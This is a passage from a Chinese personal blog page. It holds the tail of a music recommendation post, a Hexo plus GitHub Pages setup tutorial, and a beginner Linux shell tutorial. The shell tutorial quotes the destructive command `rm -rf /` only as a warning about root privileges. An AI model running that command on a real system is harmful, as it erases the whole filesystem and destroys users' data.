<p>链接：<a target="_blank" rel="noopener" href="https://music.163.com/song?id=1974436463&userid=127208986">https://music.163.com/song?id=1974436463&amp;userid=127208986</a><br>风格：garage house&#x2F;jazz</p>
</blockquote>
<p>一听到前奏就收藏了，感觉独特的jazz风电子音乐，处理地特别特别干净，作者太懂留白了。很多留白出会插入意想不到的乐器，有bass、有8-bit风电子乐器等等……</p>
<p>不过我最喜欢的还是 **[2:01 - 3:01]**，有种梦幻的感觉。</p>
<h3 id="Random-Access-Memories-Daft-Punk"><a href="#Random-Access-Memories-Daft-Punk" class="headerlink" title="Random Access Memories - Daft Punk"></a>Random Access Memories - Daft Punk</h3><blockquote>
<p>链接：<a target="_blank" rel="noopener" href="https://music.163.com/album?id=165455240&userid=127208986">https://music.163.com/album?id=165455240&amp;userid=127208986</a><br>风格：电子音乐</p>
</blockquote>
<p>真的神专，每一首都值得反复听。随便挑一首特别喜欢的出来：Giorgio by Moroder，一首由采访起手的音乐，后面有点Trance的感觉，一步步铺垫情感，我就是被Trance给害了。<br>尤其是第一段落结束后（ <strong>[4:59 - 5:15]</strong> ），在Giorgio说出：</p>
<blockquote>
<p>Once you free your mind about a concept of harmony and of music being ‘correct’,<br>you can do whatever you want.<br>So nobody told me what to do, and there was no preconception of what to do.</p>
</blockquote>
<p>之后，突然进了弦乐（ <strong>[5:15 - 5:49]</strong> ），尽情表现着星空下的自由，然后主题再次回归，搭配弦乐，谁听了不会感动！</p>
<p>除了这段外，还有一个我很喜欢的细节——搓碟的声音和鼓的声音非常搭配地重叠在一起，非常独特的听感。<br>总之，我所说的神专，之所以是神，是因为它能带给我独特的体验，我相信它也能给其他听众带来不同的体验，所以大家都快去听。</p>
<h3 id="干杯-五月天"><a href="#干杯-五月天" class="headerlink" title="干杯 - 五月天"></a>干杯 - 五月天</h3><blockquote>
<p>链接：<a target="_blank" rel="noopener" href="https://music.163.com/song?id=22197007&userid=127208986">网易云</a><br>评语：神MV。和时间、人生有关的歌总是特别吸引人，7 years也是这样。</p>
</blockquote>
<p>不剧透了，快去看MV！<br>唯一的缺陷就是音域太广了，我实在唱不了，不然每次KTV都要唱这首555</p>
<h3 id="from-Y-to-Y-乐队演奏-ろじえも"><a href="#from-Y-to-Y-乐队演奏-ろじえも" class="headerlink" title="from Y to Y (乐队演奏) - ろじえも"></a>from Y to Y (乐队演奏) - ろじえも</h3><blockquote>
<p>链接：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Sx411A7Lv">Bilibili</a><br>评语：神作，治愈系，给人以力量</p>
</blockquote>
<p>鼓手对强弱的掌控实在是太好了，这样的演奏就好像是<strong>完美</strong>的，让人觉得这里就是这样最好，没别的更好了。<br>中间一段听得鸡皮疙瘩都起来了，impressive orz，本家和演奏都是绝对的神作。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://www.cameudis.com/Tech/Blog/0cc0b8050646.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/ava1.jpg">
      <meta itemprop="name" content="Cameudis">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Cameudis' Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/Tech/Blog/0cc0b8050646.html" class="post-title-link" itemprop="url">【Blog#0x02】个人博客搭建：基于hexo+github pages</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-06-25 23:50:52" itemprop="dateCreated datePublished" datetime="2023-06-25T23:50:52+08:00">2023-06-25</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-01-11 16:34:24" itemprop="dateModified" datetime="2024-01-11T16:34:24+08:00">2024-01-11</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/" itemprop="url" rel="index"><span itemprop="name">Tech</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/Blog/" itemprop="url" rel="index"><span itemprop="name">Blog</span></a>
                </span>
            </span>

          
            <span id="/Tech/Blog/0cc0b8050646.html" class="post-meta-item leancloud_visitors" data-flag-title="【Blog#0x02】个人博客搭建：基于hexo+github pages" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/Tech/Blog/0cc0b8050646.html#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/Tech/Blog/0cc0b8050646.html" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>你是否看到朋友开了微信公众号觉得很酷？你是否想分享自己的学习笔记、生活感想？你是否想拥有自己的个人主页？</p>
<p>那就一起来试试整个博客吧，反正是免费的不用花钱（&lt;ゝω・）☆</p>
<p>方便起见，推荐在自己主系统上面配置博客，或者配置在WSL上。</p>
<h2 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a>软件安装</h2><p>请参考<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/docs/">官方文档 | Hexo</a>，Windows安装Git时，全程保持默认选项即可。</p>
<p>注意，其中命令行指令需要在你安装系统的shell上执行。如果是Windows系统的话，需要使用刚刚安装的Git所附带的Git Bash。</p>
<h2 id="静态网站生成"><a href="#静态网站生成" class="headerlink" title="静态网站生成"></a>静态网站生成</h2><p>首先，在你电脑上挑一个喜欢的位置，我们会在这里存放博客的文件夹。</p>
<p>然后打开命令行，在这里输入（把 <code>&lt;folder&gt;</code> 替换成你想要的文件夹名）：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ hexo init &lt;folder&gt;</span><br><span class="line">$ <span class="built_in">cd</span> &lt;folder&gt;</span><br><span class="line">$ npm install</span><br></pre></td></tr></table></figure>

<p>完成后，这个目录的文件树如下：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── _config.yml</span><br><span class="line">├── package.json</span><br><span class="line">├── scaffolds</span><br><span class="line">├── <span class="built_in">source</span></span><br><span class="line">|   ├── _drafts</span><br><span class="line">|   └── _posts</span><br><span class="line">└── themes</span><br></pre></td></tr></table></figure>

<p>其中，比较重要的是配置文件 <code>_config.yml</code> 以及存放用户资源（文章、图片）的 <code>source</code> 文件夹。</p>
<p>接下来我们试着创建一篇文章，在当前目录下输入 <code>hexo new &lt;artical_name&gt;</code> （将 <code>&lt;article_name&gt;</code> 替换为你想要的博客标题），hexo会帮你在 <code>source/_posts/</code> 目录生成一个新的文本文件。</p>
<p>接下来，用你喜欢的文本编辑器（或者markdown编辑器）打开这个文件，就可以使用markdown的语法来写文章啦！如果你之前没有接触过markdown的语法，可以参考<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/111833946">一看就懂的Markdown入门语法笔记（整理自Markdown cheat sheet） - 知乎</a>，说是语法其实就是普通的txt文本文件加上一些特殊的标记，特别简洁。</p>
<blockquote>
<p>我校树洞也支持md语法，比如在一行字前面加上 <code>#</code> 和一个空格，就能够让它变特别大（一级标题）。</p>
</blockquote>
<p>在编辑完成后，在命令行中输入指令 <code>hexo g</code>（g表示generate），hexo会根据当前的主题，将你写的文章转换成一个网页。然后我们再输入指令 <code>hexo s</code>（s表示server），hexo就会启动一个本地的web服务器，访问它给出的链接，就可以看到你的崭新的博客以及你刚写的一篇文章啦！</p>
<p>不过，这只是在本地的网站。接下来，我们会借助github提供的网站托管服务，将我们的网站发布在全球互联网上。</p>
<h2 id="仓库配置"><a href="#仓库配置" class="headerlink" title="仓库配置"></a>仓库配置</h2><p>首先，你需要注册一个自己的github账号，记得取一个好记简洁的名字，因为github pages的默认域名就是你的名字。（之后也可以改）</p>
<p>之后我们会需要向github服务器提交我们的博客网站代码，而这背后是hexo通过git来完成的，git又会通过SSH来完成与github服务器的通信。配置属于你的SSH密钥，可以参考Github的官方教程<a target="_blank" rel="noopener" href="https://docs.github.com/en/authentication/connecting-to-github-with-ssh/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent">Generating a new SSH key and adding it to the ssh-agent - GitHub Docs</a>。我们生成ed25519算法的key就可以。</p>
<p>在生成并配置好你的密钥后，我们需要将公钥上传到你的github账户上。我们需要在github网站上，点击右上角的头像，找到Settings，然后在左边找到 SSH and GPG keys，点击 New SSH key。</p>
<p>然后我们需要 <code>cat ~/.ssh/id_ed25519.pub</code> ，将其中的内容复制到Key那里，并在Title那里为这个Key取一个名字。然后回到命令行，输入 <code>ssh -T git@github.com</code>，然后输入yes，看提示信息即可确认你有没有成功添加。</p>
<p>之后，我们还需要配置以下git的全局的个人信息，这样你在git提交代码时就会显示你的信息了。如果你用git和别人合作码代码，某次提交出了问题大家就知道应该拷打谁了。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global user.name <span class="string">&quot;cameudis&quot;</span>			// 你的用户名</span><br><span class="line">$ git config --global user.email  <span class="string">&quot;xxx@xxx.com&quot;</span>		// 你的邮箱</span><br></pre></td></tr></table></figure>

<p>然后登上Github网页端，创建一个新的仓库，名字一定要设置为 <code>你的用户名.github.io</code>，权限选择公开。比如我的github用户名是Cameudis，我的仓库就名为 <code>Cameudis.github.io</code>，我的博客网址就会是 <code>https://cameudis.github.io/</code> （网址URL是大小写无关的）。</p>
<p>创建完毕后，打开你的博客文件夹中的配置文件 <code>_config.yml</code>，翻到最底下，把deploy的配置改成这样：</p>
<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">https://github.com/&lt;username&gt;/&lt;project&gt;</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">gh-pages</span></span><br></pre></td></tr></table></figure>

<p>然后在博客文件夹中输入 <code>npm install hexo-deployer-git --save</code>，安装一键部署插件。安装完毕后，直接输入 <code>hexo d</code>（d表示deploy），就可以将hexo生成好的网站上传到github上。之后更新了文章或博客配置，就可以先用 <code>hexo g</code> 生成，用 <code>hexo s</code> 来本地预览，然后用 <code>hexo d</code> 来上传到Github。</p>
<p>注意：有一些功能需要先使用 <code>hexo clean</code> 来将当前生成的网站清空，然后再重新 <code>hexo g</code> 生成。如果你疑惑你的更改怎么没有生效（比如换主题的时候），就可以clean之后再试试。</p>
<p>等待一分钟左右的时间，你就能在属于你的链接上看到属于你的网站了！如果等不及的话，可以在你的博客的github仓库中选择Actions查看部署进度。</p>
<h2 id="后续探索"><a href="#后续探索" class="headerlink" title="后续探索"></a>后续探索</h2><p>拥有自己的博客，一大乐趣就是折腾主题、折腾配置，把自己的网站变成想要的样子。</p>
<p>在<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/docs/configuration">官方的配置教学</a>中，有着对于 <code>_config.yml</code> 文件的说明。</p>
<p>除此以外，很多东西都在官方的文档中有着说明，推荐都看看。比如如何插入图片就可以查看<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/docs/asset-folders.html">资源文件夹 | Hexo</a></p>
<p>我使用的主题是Butterfly（进行了一点魔改），安装、配置请看这里：<a target="_blank" rel="noopener" href="https://butterfly.js.org/posts/21cfbf15/">Butterfly 安裝文檔(一) 快速開始</a>。</p>
<p>我使用的评论插件是Valine，教程请参考<a target="_blank" rel="noopener" href="https://cameudis.github.io/Tech/Blog/b9325487ff4b.html">使用Valine给Hexo博客添加评论功能 | Cameudis’s Blog</a></p>
<p>可以使用hexo-blog-encrypt来对某些文章加上密码，教程请看<a target="_blank" rel="noopener" href="https://github.com/D0n9X1n/hexo-blog-encrypt/blob/master/ReadMe.zh.md">hexo-blog-encrypt&#x2F;ReadMe_zh</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://www.cameudis.com/Tech/Linux/dd5a3c9cd555.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/ava1.jpg">
      <meta itemprop="name" content="Cameudis">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Cameudis' Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/Tech/Linux/dd5a3c9cd555.html" class="post-title-link" itemprop="url">【Linux#0x00】Shell入门</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-06-25 20:46:35" itemprop="dateCreated datePublished" datetime="2023-06-25T20:46:35+08:00">2023-06-25</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-01-11 16:34:24" itemprop="dateModified" datetime="2024-01-11T16:34:24+08:00">2024-01-11</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/" itemprop="url" rel="index"><span itemprop="name">Tech</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/Linux/" itemprop="url" rel="index"><span itemprop="name">Linux</span></a>
                </span>
            </span>

          
            <span id="/Tech/Linux/dd5a3c9cd555.html" class="post-meta-item leancloud_visitors" data-flag-title="【Linux#0x00】Shell入门" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/Tech/Linux/dd5a3c9cd555.html#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/Tech/Linux/dd5a3c9cd555.html" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>本教程初次编写于六星2023CTF夏令营，升级后作为Linux系列教程的第零篇。<br>欢迎对Linux毫无了解的读者通过本教程入门Linux命令行基础操作~</p>
<h2 id="What-is-Shell"><a href="#What-is-Shell" class="headerlink" title="What is Shell?"></a>What is Shell?</h2><p>Shell的中文是壳，读者可能听说过一部叫做《Ghost in The Shell》（攻壳机动队）的作品。</p>
<p><img src="https://makia.la/wp-content/uploads/2021/11/Ghost-in-the-Shell-pelicula-resena-4.jpg" alt="Ghost-in-the-Shell"></p>
<p>在计算机的世界中，Shell指的是一类软件，允许用户和计算机进行交互。</p>
<blockquote>
<p>In <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Computing">computing</a>, a <strong>shell</strong> is a computer program that exposes an <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Operating_system">operating system</a>‘s services to a human user or other programs. In general, operating system shells use either a <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Command-line_interface">command-line interface</a> (CLI) or <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Graphical_user_interface">graphical user interface</a> (GUI), depending on a computer’s role and particular operation. It is named a shell because it is the outermost layer around the operating system.</p>
<p>—WikiPedia</p>
</blockquote>
<p>在远古时期，我们没有鼠标，也没有图形化界面。那时候，我们就使用键盘来给计算机发送信息，而计算机就通过只能显示文字的显示屏来给我们显示信息。（当然，更远古的时期我们有的只是打孔纸带）这个能够读取我们命令，从而允许我们操作电脑、打开程序、移动文件的程序，就叫做Shell。这是计算机的Shell，也是我们自己在宽广的网络世界中的Shell。</p>
<p>在现在，Shell，尤其是 <strong>CLI Shell</strong>（Command-Line Interface Shell，命令行shell），依然在计算机世界中发光发热，为广大CSer提供着基础、方便、强大的与计算机的交互手段。尽管我们已经有了简洁直观的GUI（Graphical User Interface，图形用户界面）、智能的语音输入、甚至酷炫的Apple Vision Pro等AR&#x2F;VR设备，但这些交互方式的强大之处也正是其缺陷——它们限制了我们的自由，让我们只能按照给定的接口与设备进行交互。</p>
<p>这个教程将会已Kali系统为例（当然其他发行版也适用本教程），讲解Linux系统的shell基础。</p>
<h2 id="使用shell"><a href="#使用shell" class="headerlink" title="使用shell"></a>使用shell</h2><p>所有的Linux系统都会预装一个Shell，而这些Shell的语法都是类似的，差别大部分在于一些拓展功能。比如在Ubuntu等系统上，默认的shell是 <code>bash</code>，而Kali系统上，预装的Shell叫做 <code>zsh</code> 。</p>
<p>当你打开你的Shell程序，你会看到一个提示符（prompt），表示 <em>请您输入指令</em>，比如：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ </span><br></pre></td></tr></table></figure>

<p>本教程之后会使用 <code>$</code> 代指这个提示符。</p>
<p>在shell程序的可执行文件中，其实是一系列字符串处理的代码，负责将我们输入的字符串解析成指令来执行。比如，我们可以输入data：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">date</span></span><br><span class="line">Fri 10 Jan 2020 11:49:31 AM EST</span><br></pre></td></tr></table></figure>

<p>shell 解析我们输入的字符串 <code>&quot;date&quot;</code> ，发现用户想要获取时间，于是就打印出了当前时间。</p>
<p>我们再试试输入 <code>echo hello</code>：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> hello</span><br><span class="line">hello</span><br></pre></td></tr></table></figure>

<p>shell 解析我们输入的字符串 <code>&quot;echo hello&quot;</code> ，根据空格来分割出两个token：<code>echo</code> 以及 <code>token</code>。</p>
<p>然后 shell 将第一个token解析成指令，后面token都解析成参数。它发现我们是要求回声（echo），于是就调用相应的代码，将我们传给它的第二个token <code>hello</code> 打给了我们。</p>
<p>那我们都有哪些可以用的指令呢？我们可以用的指令大概有两种：</p>
<ul>
<li>shell自己代码实现的指令</li>
<li>计算机上的程序</li>
</ul>
<p>如果shell发现我们输入的指令并不是它自己实现的，它就会认为这是一个计算机上的程序。如果它在计算机上找不到这个程序的话，就会报错：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ Genshin start!</span><br><span class="line">Genshin: <span class="built_in">command</span> not found</span><br></pre></td></tr></table></figure>

<h3 id="Where-am-I-：文件系统"><a href="#Where-am-I-：文件系统" class="headerlink" title="Where am I?：文件系统"></a>Where am I?：文件系统</h3><p>我们知道，计算机里的文件一般是以文件夹的形式组织起来的。在Windows下，我们可以看到C盘这个”大文件夹“下面有着 <code>Program Files</code>, <code>Users</code> 等等文件夹，在其中又有着许多许多的文件夹……</p>
<p>如果我们把C盘当作树根，文件夹当作树枝，文件当作树叶，我们可以发现这不就是一棵树吗！在Linux文件系统中，真的有这么一个目录，就叫做根目录（root directory），其符号为 <code>/</code>。</p>
<p>想要看看Linux的文件树上都有哪些枝叶吗？让我们先走到树根那里：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ <span class="built_in">cd</span> / </span><br><span class="line">┌──(kali㉿kali)-[/]</span><br><span class="line">└─$ </span><br></pre></td></tr></table></figure>

<p>我们可以使用 <code>cd</code> 指令，其全称是 change directory。在shell中输入 <code>cd /</code> 之后，我们会发现prompt有一定的变化。（这很像<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Multi-user_dungeon">MUD</a>，一种的远古文字游戏）</p>
<p>有一个 <code>~</code> 符号变成了 <code>/</code>，这表示我们的位置已经到了树根这里。这里有什么呢？</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/]</span><br><span class="line">└─$ <span class="built_in">ls</span></span><br><span class="line">bin   home            lib32       media  root  swapfile  var</span><br><span class="line">boot  initrd.img      lib64       mnt    run   sys       vmlinuz</span><br><span class="line">dev   initrd.img.old  libx32      opt    sbin  tmp       vmlinuz.old</span><br><span class="line">etc   lib             lost+found  proc   srv   usr</span><br></pre></td></tr></table></figure>

<p>我们可以看到这里有很多东西，这是不同Linux发行版都会有的约定，也就是什么东西放在哪里。接下来我尝试用cd和ls结合回到家目录。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/]</span><br><span class="line">└─$ <span class="built_in">cd</span> home</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[/home]</span><br><span class="line">└─$ <span class="built_in">ls</span>     </span><br><span class="line">kali</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[/home]</span><br><span class="line">└─$ <span class="built_in">cd</span> kali</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$</span><br></pre></td></tr></table></figure>

<p>我们发现，在prompt上显示的位置又回到了 <code>~</code>。</p>
<p>我们进入（回到）这个文件夹时，顺序依次是 <code>/</code> <code>home</code> <code>kali</code>，因此可以把这个拼接成其绝对地址 <code>/home/kali</code>。</p>
<p>让我们输入 <code>pwd</code> （print working directory）来确认一下，这个指令能够告诉我们现在我们在哪：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ <span class="built_in">pwd</span>                </span><br><span class="line">/home/kali</span><br></pre></td></tr></table></figure>

<p>实际上，<code>~</code> 这个特殊符号就表示当前用户（kali）的家目录。我们可以把这里当作桌面一样的地方来保存文件。</p>
<p>常用的文件系统指令包括：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">pwd</span>    <span class="comment"># 我在哪？</span></span><br><span class="line">$ <span class="built_in">ls</span>     <span class="comment"># 这里有什么？</span></span><br><span class="line">$ <span class="built_in">cd</span> xxx <span class="comment"># 我要去xxx文件夹</span></span><br><span class="line">$ <span class="built_in">cd</span> ..  <span class="comment"># 我要去上一级文件夹</span></span><br><span class="line">$ <span class="built_in">mv</span>     <span class="comment"># 移动文件</span></span><br><span class="line">$ <span class="built_in">cp</span>	   <span class="comment"># 复制文件</span></span><br><span class="line">$ <span class="built_in">rm</span> xxx <span class="comment"># 删除文件 (文件夹要加上-r参数)</span></span><br><span class="line">$ <span class="built_in">mkdir</span>  <span class="comment"># 创建文件夹</span></span><br></pre></td></tr></table></figure>

<h3 id="文件读写：配置软件安装源（apt包管理器）"><a href="#文件读写：配置软件安装源（apt包管理器）" class="headerlink" title="文件读写：配置软件安装源（apt包管理器）"></a>文件读写：配置软件安装源（apt包管理器）</h3><p>文件夹中，不仅有着目录，还有着其他的文件。接下来我们以配置软件安装源为例，展示文件相关的操作。</p>
<p>在Linux上，有着被称为软件包管理器的一类软件，负责统一管理系统上软件或库的安装、升级、卸载，类似苹果的App Store。由于这是统一管理的，所以安装软件或库会非常方便。</p>
<p>通常而言，在国内安装Linux之后，首先就是需要更改所使用的软件包管理器（Ubuntu和Kali都使用apt）的软件仓库地址（或者称为软件源）。由于某种神秘力量的影响，国内可能不能访问官方默认的软件源（或很慢），因此国内有许多组织都维护了镜像站（也就是官方源的国内镜像版本）。</p>
<p>比如说，可以使用由 USTC LUG（中科大 Linux User Group）维护的镜像服务，官方教程的链接是：<a target="_blank" rel="noopener" href="https://mirrors.ustc.edu.cn/help/">发行版镜像使用帮助</a>。</p>
<p>在上面这个教程中，可能写了这个：</p>
<blockquote>
<p>编辑 <code>/etc/apt/sources.list</code> 文件, 在文件最前面添加以下条目：……</p>
</blockquote>
<p>运用上面的知识，我们已经可以移动到 <code>/etc/apt/</code> 文件夹，并且用 <code>ls</code> 看到这个目录下确实有一个 <code>sources.list</code> 文件。</p>
<p>我们可以使用 <code>cat</code> 指令来查看这个文件有什么内容，只需要在 <code>cat</code> 后面加上这个文件的路径。由于这个文件就在当前文件夹，所以只需要输入文件名即可，这是一种相对路径。你可以使用tab键来让shell帮你自动补全文件名，减少输入的功夫。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/etc/apt]</span><br><span class="line">└─$ <span class="built_in">cat</span> sources.list</span><br><span class="line"><span class="comment"># See https://www.kali.org/docs/general-use/kali-linux-sources-list-repositories/</span></span><br><span class="line">deb http://http.kali.org/kali kali-rolling main contrib non-free non-free-firmware</span><br><span class="line"></span><br><span class="line"><span class="comment"># Additional line for source packages</span></span><br><span class="line"><span class="comment"># deb-src http://http.kali.org/kali kali-rolling main contrib non-free non-free-firmware</span></span><br></pre></td></tr></table></figure>

<p>现在这个文件里已经有这么几行链接了，接下来我们尝试使用 <code>nano</code> 编辑器来对其进行编辑，还是和上次一样，只需要在 <code>nano</code> 后面加上文件名（也就是用相对路径引用这个文件）：</p>
<p><code>$ nano sources.list</code></p>
<p>打开后，我们会在底下发现一行红色报错：<code>File &#39;sources.list&#39; is unwritable</code></p>
<h4 id="Linux用户、用户组、权限"><a href="#Linux用户、用户组、权限" class="headerlink" title="Linux用户、用户组、权限"></a>Linux用户、用户组、权限</h4><p>真的unwritable吗？如wri。</p>
<p>Linux系统给许多重要的文件、目录都设置了权限要求，没有权限的普通用户没办法修改。（是的，默认的用户kali是普通用户）在Linux系统中，有一个特殊的用户叫做root，几乎拥有一切权限，但为了这台计算机系统的安全起见，我们一般都不会登录这个用户。</p>
<p>试想一下，当你一不小心在命令行上敲出了 <code>rm -rf /</code> （对整个文件系统进行删除），如果你这时候还是普通用户的话，系统会提示你权限不够，从而保护了自己。但如果你是root用户的话……和这台系统说再见吧~</p>
<p>我们可以用 <code>ls -l</code> 来查看当前目录下各种文件的详细信息，其中各列信息如下所示：</p>
<table>
<thead>
<tr>
<th>文件属性</th>
<th>文件数</th>
<th>拥有者</th>
<th>所属group</th>
<th>文件大小</th>
<th>创建时间</th>
<th>文件名</th>
</tr>
</thead>
<tbody><tr>
<td>drwxr-xr-x</td>
<td>2</td>
<td>root</td>
<td>root</td>
<td>4096</td>
<td>Jun  3 13:38</td>
<td>apt.conf.d</td>
</tr>
<tr>
<td>-rw-r–r–</td>
<td>1</td>
<td>root</td>
<td>root</td>
<td>1033</td>
<td>Jan  1 10:12</td>
<td>sources.list</td>
</tr>
</tbody></table>
<p>文件属性一共有十个字母，第0个表示文件类型，d指directory，-指普通文件。</p>
<p>1<del>3，4</del>6，7~9分别为一组，分别表示文件所有者、所属group用户、其他用户对文件的权限。r表示可读（readable），w表示可写（writable），x表示可执行（executable）。</p>
<p>我们观察sources.list的文件属性，可以发现root用户可以进行读写，而root group的用户和其他用户都只读。</p>
<p>因此，为了修改这个文件，我们必须要使用root用户的权限。好在这有一种简单的方法可以做到：在想要执行的指令之前加上 <code>sudo</code>。因此我们还是可以写的。</p>
